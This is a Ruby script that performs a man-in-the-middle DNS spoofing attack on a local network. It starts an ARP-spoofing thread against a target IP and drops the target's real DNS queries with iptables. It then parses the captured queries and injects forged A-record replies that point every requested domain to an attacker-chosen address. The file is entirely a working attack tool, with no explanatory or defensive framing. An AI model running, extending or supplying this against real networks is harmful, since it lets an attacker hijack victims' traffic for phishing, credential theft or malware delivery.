#!/usr/bin/ruby

require 'rubygems'
require 'packetfu'
require 'thread'
require 'trollop'

arpDir = "#{Dir.pwd}" + "/arpSpoof.rb"

require arpDir

include PacketFu

class SniffDNS 
	def initialize
		opts = Trollop::options do
			opt :iface, "NIC Device", :default => "wlan0"
			opt :targetsAddr, "Target's IP Address", :default => "192.168.0.33"
			opt :spoofAddr, "Spoof IP Address", :default => "24.86.113.108"
		end

        @config = Utils.whoami?(:iface=> opts.iface)
        $targetsAddr = opts.targetsAddr
        @targetsMac = Utils.arp(opts.targetsAddr, :timeout => 0.1, :iface=> opts.iface)
		@iface = opts.iface
		$spoofAddr = opts.spoofAddr

		@nonCountedPayload = 3 # End of record, and type.
		@dnsStartCount = 12
	end

	def start
		# Drop all forward DNS queries
	    `iptables -A FORWARD -p udp -s #{$targetsAddr} --dport 53 -j DROP`

		$thread = Thread.new { @arpSpoof = ArpSpoof.new(@config, $targetsAddr, @targetsMac, @iface) ; @arpSpoof.start }
		filter = "udp and port 53 and src host #{$targetsAddr}"

		pkt_array = Capture.new(:iface => @iface, :start => true, :promisc => true, \
											:filter => filter, :save=>true)

    	puts "Started capturing DNS..."
    	
		pkt_array.stream.each do |p|
			@pkt = Packet.parse(p)
			#Check if packet type is DNS query
			@dnsCount = @pkt.payload[2].unpack('h*')[0].chr+@pkt.payload[3].unpack('h*')[0].chr
			if @dnsCount=='10'
				headerCount=12 #Starts at domain name count
				@domainName = ""
				while headerCount<100
					if @pkt.payload[headerCount].unpack('H*')[0]=='00' # terminate - since end of record
						break
					else
						counter = @pkt.payload[headerCount].unpack('H*')[0].to_i(16)
						if headerCount!=12
							@domainName+="."
						end
						for i in 1..counter
							headerCount+=1 # Increment to get the domain hex values
							temp = @pkt.payload[headerCount].unpack('H*')[0]
							@domainName += "#{temp.hex.chr}"
						end
						headerCount+=1 # Increment to get the next counter
					end
				end
			end

			#Get payload # to type
			type = @domainName.length + @nonCountedPayload + @dnsStartCount
			
			#Check if the DNS Query type is A
			if @pkt.payload[type].unpack('H*')[0]=='01'
				transID1 = @pkt.payload[0].unpack('H*')[0]
				transID2 = @pkt.payload[1].unpack('H*')[0]
				sendDnsResponse(@domainName, transID1, transID2)
			end
		end
	end
private
    def sendDnsResponse(domainName, transID1, transID2)
		hexDomainName=domainName
		transID = transID1.hex.chr+transID2.hex.chr

		puts "Attempting to DNS Spoof #{hexDomainName}"
		puts "TransID: #{transID.unpack('H*')[0]}"
		puts "\n"

        udp_pkt = UDPPacket.new(:config => @config, :udp_src => @pkt.udp_dst, :udp_dst => @pkt.udp_src)
        udp_pkt.eth_daddr = @targetsMac
        udp_pkt.ip_daddr = $targetsAddr
        udp_pkt.ip_saddr = @pkt.ip_daddr
        udp_pkt.payload = transID
        udp_pkt.payload += "\x81"+"\x80"+"\x00"+"\x01" # Flags and questions hex values
        udp_pkt.payload += "\x00"+"\x01"+"\x00"+"\x00"+"\x00"+"\x00" # Responses hex values

		splitDomainName = hexDomainName.split(".")

		splitDomainName.each do |dn|
			udp_pkt.payload += dn.length.chr
            udp_pkt.payload += dn
		end	

        udp_pkt.payload += "\x00"+"\x00"+"\x01"+"\x00"+"\x01" # End of response, and Queries hex values
        udp_pkt.payload += "\xc0"+"\x0c"+"\x00"+"\x01"+"\x00"+"\x01" # Answers' Name, type, and class hex values
        udp_pkt.payload += "\x00"+"\x00"+"\x01"+"\x15" #TTL hex value (4 min 47 seconds)
        udp_pkt.payload += "\x00"+"\x04" #Data length

        ipstr = $spoofAddr.split(".")
        udp_pkt.payload += [ipstr[0].to_i, ipstr[1].to_i, ipstr[2].to_i, ipstr[3].to_i].pack('C*')

        udp_pkt.recalc
        udp_pkt.to_w(@iface)
	end
end

begin
	sniff = SniffDNS.new
	sniff.start
rescue Interrupt
	puts "\nStopped ARP spoofing by the interrupt signal."
	Thread.kill($thread)
	`echo 0 > /proc/sys/net/ipv4/ip_forward`
	`iptables -D FORWARD -p udp -s #{$targetsAddr} --dport 53 -j DROP`
	exit 0
end
